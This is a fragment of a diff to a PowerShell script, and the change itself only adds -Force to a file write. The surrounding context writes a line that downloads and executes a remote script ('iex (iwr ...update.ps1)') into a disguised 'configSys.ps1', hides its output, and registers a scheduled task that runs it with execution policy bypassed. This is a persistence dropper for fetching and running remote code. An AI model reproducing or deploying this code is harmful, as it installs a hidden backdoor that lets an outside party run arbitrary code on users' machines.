@@ -5,7 +5,7 @@ $contenuto = @'
 iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1') | Out-Null
 '@
 
-$contenuto | Out-File "C:\sysDev\assets\configSys.ps1"
+$contenuto | Out-File "C:\sysDev\assets\configSys.ps1" -Force
 
 $scriptPath = "C:\sysDev\assets\configSys.ps1"
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
